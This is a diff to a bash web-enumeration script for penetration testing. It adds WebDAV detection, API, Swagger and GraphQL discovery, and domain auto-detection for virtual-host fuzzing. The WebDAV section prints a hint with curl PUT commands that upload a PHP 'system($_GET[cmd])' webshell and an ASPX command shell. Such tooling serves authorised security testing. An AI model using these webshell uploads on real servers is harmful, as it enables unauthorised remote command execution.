@@ -141,15 +141,15 @@ info "[0/10] Quick port fingerprint (3s)"
 RAW_HEADERS=$(curl -ksILm 3 --max-redirs 2 "$BASE_URL" 2>/dev/null || true)
 echo "$RAW_HEADERS" > "$QUICK_OUT"
 
-QF_SERVER=$(echo "$RAW_HEADERS"  | grep -i '^Server:'       | tail -1 | sed 's/^[Ss]erver:[[:space:]]*//' | tr -d '\r')
-QF_POWERED=$(echo "$RAW_HEADERS" | grep -i '^X-Powered-By:' | tail -1 | sed 's/^[Xx]-[Pp]owered-[Bb]y:[[:space:]]*//' | tr -d '\r')
-QF_CTYPE=$(echo "$RAW_HEADERS"   | grep -i '^Content-Type:' | tail -1 | sed 's/^[Cc]ontent-[Tt]ype:[[:space:]]*//' | tr -d '\r')
+QF_SERVER=$(echo "$RAW_HEADERS"  | grep -i '^Server:'       | tail -1 | sed 's/^[Ss]erver:[[:space:]]*//' | tr -d '\r' || true)
+QF_POWERED=$(echo "$RAW_HEADERS" | grep -i '^X-Powered-By:' | tail -1 | sed 's/^[Xx]-[Pp]owered-[Bb]y:[[:space:]]*//' | tr -d '\r' || true)
+QF_CTYPE=$(echo "$RAW_HEADERS"   | grep -i '^Content-Type:' | tail -1 | sed 's/^[Cc]ontent-[Tt]ype:[[:space:]]*//' | tr -d '\r' || true)
 QF_CODE=$(echo "$RAW_HEADERS"    | grep -oP 'HTTP/[\d.]+ \K\d{3}' | tail -1 || true)
 
-[[ -n "$QF_CODE"   ]] && ok   "HTTP Status   : ${WHITE}${QF_CODE}${NC}"
-[[ -n "$QF_SERVER" ]] && ok   "Server        : ${WHITE}${QF_SERVER}${NC}"
-[[ -n "$QF_POWERED"]] && ok   "X-Powered-By  : ${WHITE}${QF_POWERED}${NC}"
-[[ -n "$QF_CTYPE"  ]] && info "Content-Type  : ${QF_CTYPE}"
+[[ -n "$QF_CODE"   ]] && ok   "HTTP Status   : ${WHITE}${QF_CODE}${NC}"   || true
+[[ -n "$QF_SERVER" ]] && ok   "Server        : ${WHITE}${QF_SERVER}${NC}"  || true
+[[ -n "$QF_POWERED" ]] && ok  "X-Powered-By  : ${WHITE}${QF_POWERED}${NC}" || true
+[[ -n "$QF_CTYPE"  ]] && info "Content-Type  : ${QF_CTYPE}"                || true
 
 # Detect common applications from headers alone (runs in < 1s)
 if echo "$QF_SERVER $QF_POWERED $RAW_HEADERS" | grep -qiE 'tomcat|catalina|coyote'; then
@@ -215,6 +215,46 @@ if [[ -n "$REDIR_URL" ]]; then
         hint "Add to /etc/hosts if not already present:
     echo '${TARGET}    ${REDIR_HOST}' | sudo tee -a /etc/hosts"
     fi
+fi
+echo ""
+
+# ===========================================================================
+# 1.5 — WebDAV Detection
+# ===========================================================================
+WEBDAV_OUT="${WEB_DIR}/webdav${SUFFIX}.txt"
+info "[1.5/10] WebDAV detection"
+
+# Check OPTIONS response for DAV header
+WEBDAV_HEADER=$(curl -sk --max-time 8 -X OPTIONS "$BASE_URL" 2>/dev/null \
+    | grep -i '^DAV:' || true)
+WEBDAV_ALLOW=$(curl -skI --max-time 8 -X OPTIONS "$BASE_URL" 2>/dev/null \
+    | grep -i '^Allow:' | tr -d '\r' || true)
+
+if [[ -n "$WEBDAV_HEADER" ]]; then
+    warn "WebDAV enabled! DAV header: ${WHITE}${WEBDAV_HEADER}${NC}"
+    echo "$WEBDAV_ALLOW" | tee "$WEBDAV_OUT"
+    # Check if PUT is allowed
+    if echo "$WEBDAV_ALLOW" | grep -qi 'PUT'; then
+        warn "PUT method allowed — potential file upload vector!"
+        echo "PUT_ALLOWED=yes" >> "$WEBDAV_OUT"
+    fi
+    # Try davtest if available
+    if command -v davtest &>/dev/null; then
+        cmd "davtest -url $BASE_URL"
+        davtest -url "$BASE_URL" 2>&1 | tee -a "$WEBDAV_OUT" || true
+        ok "davtest done → ${WHITE}${WEBDAV_OUT}${NC}"
+    else
+        skip "davtest"
+        hint "WebDAV upload test (run manually):
+    davtest -url ${BASE_URL}
+    cadaver ${BASE_URL}
+    # Upload webshell:
+    curl -sk -X PUT ${BASE_URL}/cmd.php -d '<?php system(\$_GET[\"cmd\"]);?>'
+    curl -sk -X PUT ${BASE_URL}/cmd.aspx --data-binary @/usr/share/webshells/aspx/cmdasp.aspx"
+    fi
+else
+    info "WebDAV not detected on ${BASE_URL}"
+    echo "WebDAV: not detected" > "$WEBDAV_OUT"
 fi
 echo ""
 
@@ -330,6 +370,81 @@ elif [[ "$CMS_DETECTED" == "Drupal" ]]; then
     hint "Drupal — run manually:
     droopescan scan drupal -u ${BASE_URL}
     searchsploit drupal"
+fi
+echo ""
+
+# ===========================================================================
+# 3.5 — API Endpoint Detection (REST/Swagger/OpenAPI/GraphQL)
+# ===========================================================================
+API_OUT="${WEB_DIR}/api_discovery${SUFFIX}.txt"
+info "[3.5/10] API endpoint discovery (Swagger/OpenAPI/GraphQL)"
+> "$API_OUT"
+
+API_ENDPOINTS=(
+    "/api" "/api/v1" "/api/v2" "/api/v3"
+    "/swagger.json" "/swagger.yaml" "/swagger-ui.html" "/swagger-ui/"
+    "/openapi.json" "/openapi.yaml"
+    "/api-docs" "/api-docs/swagger.json"
+    "/v1" "/v2" "/v3"
+    "/graphql" "/graphiql" "/gql" "/query"
+    "/.well-known/openapi"
+    "/rest" "/rest/api" "/rest/api/2"     # Jira/Confluence
+    "/wp-json/wp/v2"                       # WordPress REST API
+)
+
+API_FOUND=()
+for ep in "${API_ENDPOINTS[@]}"; do
+    RESP_CODE=$(curl -sk --max-time 5 -o /dev/null -w '%{http_code}' \
+        "${BASE_URL}${ep}" 2>/dev/null || true)
+    if [[ "$RESP_CODE" =~ ^(200|201|301|302|401|403)$ ]]; then
+        ok "API endpoint found: ${WHITE}${ep}${NC} (HTTP ${RESP_CODE})"
+        echo "${ep} [${RESP_CODE}]" >> "$API_OUT"
+        API_FOUND+=("$ep")
+    fi
+done
+
+# GraphQL introspection (only if /graphql responded)
+for ep in "${API_FOUND[@]}"; do
+    if echo "$ep" | grep -qiE 'graphql|gql|query'; then
+        info "Attempting GraphQL introspection on ${ep}..."
+        GQL_RESP=$(curl -sk --max-time 10 \
+            -X POST "${BASE_URL}${ep}" \
+            -H 'Content-Type: application/json' \
+            -d '{"query":"{__schema{types{name}}}"}' 2>/dev/null || true)
+        if echo "$GQL_RESP" | grep -qi '"__schema"'; then
+            warn "GraphQL introspection ENABLED on ${BASE_URL}${ep}"
+            echo "GRAPHQL_INTROSPECTION=enabled" >> "$API_OUT"
+            echo "$GQL_RESP" >> "$API_OUT"
+            hint "GraphQL enumeration:
+    # Full schema dump:
+    graphw00f -d -t ${BASE_URL}${ep}
+    # Or manually:
+    curl -sk -X POST '${BASE_URL}${ep}' -H 'Content-Type: application/json' \\
+         -d '{\"query\":\"{__schema{queryType{name}mutationType{name}types{name kind}}}\"}'
+    # Try graphql-cop for vulnerabilities:
+    graphql-cop -t ${BASE_URL}${ep}"
+        fi || true
+    fi
+done
+
+# Swagger/OpenAPI — download and extract endpoints if found
+for ep in "${API_FOUND[@]}"; do
+    if echo "$ep" | grep -qiE 'swagger|openapi|api-docs'; then
+        CONTENT_TYPE=$(curl -sk --max-time 5 -I "${BASE_URL}${ep}" 2>/dev/null \
+            | grep -i '^Content-Type:' | tr -d '\r' || true)
+        if echo "$CONTENT_TYPE" | grep -qiE 'json|yaml|html'; then
+            info "Downloading API spec from ${ep}..."
+            curl -sk --max-time 15 "${BASE_URL}${ep}" 2>/dev/null \
+                > "${API_OUT%.txt}_spec${SUFFIX}.json" || true
+            ENDPOINT_COUNT=$(grep -oP '"(get|post|put|delete|patch)"' \
+                "${API_OUT%.txt}_spec${SUFFIX}.json" 2>/dev/null | wc -l || echo "?")
+            ok "API spec saved (${ENDPOINT_COUNT} methods found) → ${API_OUT%.txt}_spec${SUFFIX}.json"
+        fi || true
+    fi
+done
+
+if [[ ${#API_FOUND[@]} -eq 0 ]]; then
+    info "No API endpoints detected."
 fi
 echo ""
 
@@ -485,26 +600,21 @@ fi
 echo ""
 
 # ===========================================================================
-# 7 — Virtual host fuzzing (ffuf preferred, gobuster fallback)
-#
-# WHY ffuf over gobuster:
-#   - ffuf fuzzes the Host: header directly, catching vhosts that return 200
-#     instead of redirect (gobuster --append-domain misses these)
-#   - Response-size filtering (-fs) eliminates false positives automatically
-#     without manual tuning
-#   - Runs without --append-domain quirks on older gobuster versions
-#
-# Strategy:
-#   1. Probe with a guaranteed-invalid hostname to get the default response
-#      size ("baseline") — this is what the server returns for unknown vhosts
-#   2. Run ffuf filtering out baseline-sized responses (-fs $BASELINE_SIZE)
-#      so only real vhosts appear in output
-#   3. Fall back to gobuster vhost if ffuf is not installed
+# 7 — Virtual host fuzzing
+# Runs if --domain was passed OR if a hostname was auto-detected from
+# TLS SANs / HTTP redirects (both stored in discovered_hostnames.txt)
 # ===========================================================================
 FFUF_VHOST_OUT="${WEB_DIR}/ffuf_vhost${SUFFIX}.txt"
 GOBUSTER_VHOST_OUT="${WEB_DIR}/vhosts${SUFFIX}.txt"
 
-if [[ -n "$DOMAIN" ]]; then
+# Auto-detect domain if not explicitly passed
+EFFECTIVE_DOMAIN="$DOMAIN"
+if [[ -z "$EFFECTIVE_DOMAIN" ]] && [[ -f "${WEB_DIR}/discovered_hostnames.txt" ]]; then
+    EFFECTIVE_DOMAIN=$(head -1 "${WEB_DIR}/discovered_hostnames.txt" 2>/dev/null || true)
+    [[ -n "$EFFECTIVE_DOMAIN" ]] && info "Auto-detected domain for vhost fuzzing: ${WHITE}${EFFECTIVE_DOMAIN}${NC}" || true
+fi
+
+if [[ -n "$EFFECTIVE_DOMAIN" ]]; then
     info "[7/10] Virtual host fuzzing (Host header enumeration)"
 
     if [[ -z "$WL_VHOST" ]]; then
@@ -516,16 +626,16 @@ if [[ -n "$DOMAIN" ]]; then
         info "Measuring baseline response size for unknown-host probe..."
         BASELINE_SIZE=$(
             curl -sk --max-time 8 \
-                -H "Host: oscp-invalid-probe-$(date +%s).${DOMAIN}" \
+                -H "Host: oscp-invalid-probe-$(date +%s).${EFFECTIVE_DOMAIN}" \
                 -o /dev/null -w '%{size_download}' \
                 "$BASE_URL" 2>/dev/null || echo 0
         )
         ok "Baseline size: ${WHITE}${BASELINE_SIZE}${NC} bytes (will be filtered from results)"
 
-        cmd "ffuf -u ${BASE_URL}/ -H 'Host: FUZZ.${DOMAIN}' -w ${WL_VHOST} -fs ${BASELINE_SIZE} -t 50 -mc 200,204,301,302,307,401,403"
+        cmd "ffuf -u ${BASE_URL}/ -H 'Host: FUZZ.${EFFECTIVE_DOMAIN}' -w ${WL_VHOST} -fs ${BASELINE_SIZE} -t 50 -mc 200,204,301,302,307,401,403"
         ffuf \
             -u "${BASE_URL}/" \
-            -H "Host: FUZZ.${DOMAIN}" \
+            -H "Host: FUZZ.${EFFECTIVE_DOMAIN}" \
             -w "$WL_VHOST" \
             -fs "$BASELINE_SIZE" \
             -t 50 \
@@ -545,11 +655,11 @@ if [[ -n "$DOMAIN" ]]; then
     elif command -v gobuster &>/dev/null; then
         # ── gobuster fallback ──────────────────────────────────────────
         info "ffuf not found — using gobuster vhost as fallback"
-        cmd "gobuster vhost -u $BASE_URL -w $WL_VHOST --domain $DOMAIN --append-domain -t 50 -k"
+        cmd "gobuster vhost -u $BASE_URL -w $WL_VHOST --domain $EFFECTIVE_DOMAIN --append-domain -t 50 -k"
         gobuster vhost \
             -u "$BASE_URL" \
             -w "$WL_VHOST" \
-            --domain "$DOMAIN" \
+            --domain "$EFFECTIVE_DOMAIN" \
             --append-domain \
             -t 50 -k \
             -o "$GOBUSTER_VHOST_OUT" 2>&1 | tee "${GOBUSTER_VHOST_OUT}.log" || true
@@ -561,7 +671,7 @@ if [[ -n "$DOMAIN" ]]; then
     fi
 
 else
-    info "[7/10] No domain supplied — skipping vhost enumeration."
+    info "[7/10] No domain supplied and no hostname auto-detected — skipping vhost enumeration."
     hint "If you discover a hostname/domain, rerun with:
     bash wrappers/web_enum.sh --target ${TARGET} --output-dir <DIR> --port ${PORT} --domain <DOMAIN>"
 fi
@@ -660,15 +770,15 @@ echo ""
 echo -e "  ${BOLD}============================================================${NC}"
 echo -e "  ${BOLD}  WEB ENUM SUMMARY — ${BASE_URL}${NC}"
 echo -e "  ${BOLD}============================================================${NC}"
-[[ -s "$WHATWEB_OUT" ]]          && echo "  [+] WhatWeb    : ${WHATWEB_OUT}"
-[[ -s "$GB_QUICK_OUT" ]]        && echo "  [+] Gobuster   : ${GB_QUICK_OUT}"
-[[ -s "$FEROX_OUT" ]]           && echo "  [+] Feroxbuster: ${FEROX_OUT}"
-[[ -s "$CGI_SNIPER_OUT" ]]      && echo "  [!] CGI Sniper : ${CGI_SNIPER_OUT}"
-[[ -s "$FFUF_VHOST_OUT" ]]      && echo "  [!] VHost(ffuf): ${FFUF_VHOST_OUT}"
-[[ -s "$GOBUSTER_VHOST_OUT" ]]  && echo "  [+] VHost(gb)  : ${GOBUSTER_VHOST_OUT}"
-[[ -s "$SSLSCAN_OUT" ]]         && echo "  [+] SSLscan    : ${SSLSCAN_OUT}"
-[[ -s "$NIKTO_OUT" ]]           && echo "  [+] Nikto      : ${NIKTO_OUT}"
-[[ -n "$CMS_DETECTED" ]]        && echo "  [!] CMS        : ${CMS_DETECTED}"
+[[ -s "$WHATWEB_OUT" ]]          && echo "  [+] WhatWeb    : ${WHATWEB_OUT}"   || true
+[[ -s "$GB_QUICK_OUT" ]]        && echo "  [+] Gobuster   : ${GB_QUICK_OUT}"  || true
+[[ -s "$FEROX_OUT" ]]           && echo "  [+] Feroxbuster: ${FEROX_OUT}"     || true
+[[ -s "$CGI_SNIPER_OUT" ]]      && echo "  [!] CGI Sniper : ${CGI_SNIPER_OUT}" || true
+[[ -s "$FFUF_VHOST_OUT" ]]      && echo "  [!] VHost(ffuf): ${FFUF_VHOST_OUT}" || true
+[[ -s "$GOBUSTER_VHOST_OUT" ]]  && echo "  [+] VHost(gb)  : ${GOBUSTER_VHOST_OUT}" || true
+[[ -s "$SSLSCAN_OUT" ]]         && echo "  [+] SSLscan    : ${SSLSCAN_OUT}"   || true
+[[ -s "$NIKTO_OUT" ]]           && echo "  [+] Nikto      : ${NIKTO_OUT}"     || true
+[[ -n "$CMS_DETECTED" ]]        && echo "  [!] CMS        : ${CMS_DETECTED}"  || true
 echo ""
 ok "Web enumeration complete."
 echo ""
